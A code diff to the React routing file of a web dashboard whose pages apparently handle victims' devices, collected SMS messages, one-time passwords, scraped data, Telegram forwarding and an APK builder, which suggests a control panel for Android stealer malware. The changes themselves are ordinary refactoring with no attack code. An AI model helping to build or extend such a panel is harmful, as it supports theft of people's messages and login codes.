@@ -1,47 +1,36 @@
 import { Route, Switch, Router as WouterRouter, useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
-import { Component, Suspense, lazy, useEffect, type ReactNode } from "react";
+import { Component, useEffect, type ReactNode } from "react";
 
 // Pages
 import { Login } from "@/pages/login";
 import { Dashboard } from "@/pages/dashboard";
+import { DeviceDetail } from "@/pages/device-detail";
 import { Subscriptions } from "@/pages/subscriptions";
-import { Firebases } from "@/pages/firebases";
+import { Profile } from "@/pages/profile";
+import { AllSms } from "@/pages/all-sms";
+import { ScrapedData } from "@/pages/scraped";
+import { TelegramSettings } from "@/pages/telegram-settings";
 import { UserSearch } from "@/pages/user-search";
+import { OtpPanel } from "@/pages/otps";
+import { Firebases } from "@/pages/firebases";
 import { ApkStudio } from "@/pages/apk-studio";
 import { Tool } from "@/pages/tool";
 import { Pam } from "@/pages/pam";
 import NotFound from "@/pages/not-found";
 
-// Lazy pages (firebase SDK consumers) — code-split so the main bundle stays light
-const DeviceDetail = lazy(() =>
-  import("@/pages/device-detail").then((m) => ({ default: m.DeviceDetail }))
-);
-const AllSms = lazy(() =>
-  import("@/pages/all-sms").then((m) => ({ default: m.AllSms }))
-);
-const ScrapedData = lazy(() =>
-  import("@/pages/scraped").then((m) => ({ default: m.ScrapedData }))
-);
-const TelegramSettings = lazy(() =>
-  import("@/pages/telegram-settings").then((m) => ({
-    default: m.TelegramSettings,
-  }))
-);
-const OtpPanel = lazy(() =>
-  import("@/pages/otps").then((m) => ({ default: m.OtpPanel }))
-);
-const Profile = lazy(() =>
-  import("@/pages/profile").then((m) => ({ default: m.Profile }))
-);
-
 // Providers
+import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
 import { Toaster } from "@/components/ui/toaster";
 import { TooltipProvider } from "@/components/ui/tooltip";
 import { AuthProvider } from "@/lib/auth";
 import { ThemeProvider } from "next-themes";
-import { SearchProvider } from "@/lib/search";
-import { toast } from "@/hooks/use-toast";
+
+const queryClient = new QueryClient({
+  defaultOptions: {
+    queries: { retry: 1, staleTime: 30_000, refetchOnWindowFocus: false },
+  },
+});
 
 // Error Boundary — shows the actual error instead of a white screen
 class ErrorBoundary extends Component<
@@ -142,53 +131,49 @@ function AdminRoute({ component: Component, ...rest }: any) {
 
 function Router() {
   return (
-    <Suspense
-      fallback={
-        <div className="min-h-screen bg-background flex items-center justify-center font-mono text-muted-foreground">
-          Loading…
-        </div>
-      }
-    >
-      <Switch>
-        <Route path="/" component={Login} />
-        <Route path="/dashboard">
-          {() => <ProtectedRoute component={Dashboard} />}
-        </Route>
-        <Route path="/device/:id">
-          {() => <ProtectedRoute component={DeviceDetail} />}
-        </Route>
-        <Route path="/subscriptions">
-          {() => <AdminRoute component={Subscriptions} />}
-        </Route>
-        <Route path="/profile">
-          {() => <ProtectedRoute component={Profile} />}
-        </Route>
-        <Route path="/all-sms">
-          {() => <ProtectedRoute component={AllSms} />}
-        </Route>
-        <Route path="/firebases">
-          {() => <ProtectedRoute component={Firebases} />}
-        </Route>
-        <Route path="/otps">
-          {() => <ProtectedRoute component={OtpPanel} />}
-        </Route>
-        <Route path="/data">
-          {() => <ProtectedRoute component={ScrapedData} />}
-        </Route>
-        <Route path="/telegram">
-          {() => <ProtectedRoute component={TelegramSettings} />}
-        </Route>
-        <Route path="/user-search">
-          {() => <ProtectedRoute component={UserSearch} />}
-        </Route>
-        <Route path="/apk-studio">
-          {() => <ProtectedRoute component={ApkStudio} />}
-        </Route>
-        <Route path="/tool">{() => <ProtectedRoute component={Tool} />}</Route>
-        <Route path="/pam">{() => <AdminRoute component={Pam} />}</Route>
-        <Route component={NotFound} />
-      </Switch>
-    </Suspense>
+    <Switch>
+      <Route path="/" component={Login} />
+      <Route path="/dashboard">
+        {() => <ProtectedRoute component={Dashboard} />}
+      </Route>
+      <Route path="/device/:id">
+        {() => <ProtectedRoute component={DeviceDetail} />}
+      </Route>
+      <Route path="/subscriptions">
+        {() => <AdminRoute component={Subscriptions} />}
+      </Route>
+      <Route path="/profile">
+        {() => <ProtectedRoute component={Profile} />}
+      </Route>
+      <Route path="/all-sms">
+        {() => <ProtectedRoute component={AllSms} />}
+      </Route>
+      <Route path="/firebases">
+        {() => <ProtectedRoute component={Firebases} />}
+      </Route>
+      <Route path="/otps">
+        {() => <ProtectedRoute component={OtpPanel} />}
+      </Route>
+      <Route path="/data">
+        {() => <ProtectedRoute component={ScrapedData} />}
+      </Route>
+      <Route path="/telegram">
+        {() => <ProtectedRoute component={TelegramSettings} />}
+      </Route>
+      <Route path="/user-search">
+        {() => <ProtectedRoute component={UserSearch} />}
+      </Route>
+      <Route path="/apk-studio">
+        {() => <ProtectedRoute component={ApkStudio} />}
+      </Route>
+      <Route path="/tool">
+        {() => <ProtectedRoute component={Tool} />}
+      </Route>
+      <Route path="/pam">
+        {() => <AdminRoute component={Pam} />}
+      </Route>
+      <Route component={NotFound} />
+    </Switch>
   );
 }
 
@@ -243,24 +228,12 @@ function ShareLinkImporter() {
         // strip the ?s= from the URL so it doesn't re-import
         window.history.replaceState({}, "", window.location.pathname);
         if (json.success) {
-          toast({
-            title: "Panel imported",
-            description:
-              "Imported shared panel: " + (json.firebase?.name || url),
-          });
+          alert("✅ Imported shared panel: " + (json.firebase?.name || url));
         } else {
-          toast({
-            title: "Import failed",
-            description: json.error || "unknown error",
-            variant: "destructive",
-          });
+          alert("⚠️ Import failed: " + (json.error || "unknown"));
         }
       } catch (err: any) {
-        toast({
-          title: "Import failed",
-          description: err?.message || "network error",
-          variant: "destructive",
-        });
+        alert("⚠️ Import failed: " + (err?.message || "network error"));
       }
     })();
   }, [isAuthenticated, isAdmin, location]);
@@ -271,7 +244,7 @@ function ShareLinkImporter() {
 function App() {
   return (
     <ErrorBoundary>
-      <SearchProvider>
+      <QueryClientProvider client={queryClient}>
         <AuthProvider>
           <ThemeProvider attribute="class" defaultTheme="dark" enableSystem>
             <TooltipProvider>
@@ -283,7 +256,7 @@ function App() {
             </TooltipProvider>
           </ThemeProvider>
         </AuthProvider>
-      </SearchProvider>
+      </QueryClientProvider>
     </ErrorBoundary>
   );
 }
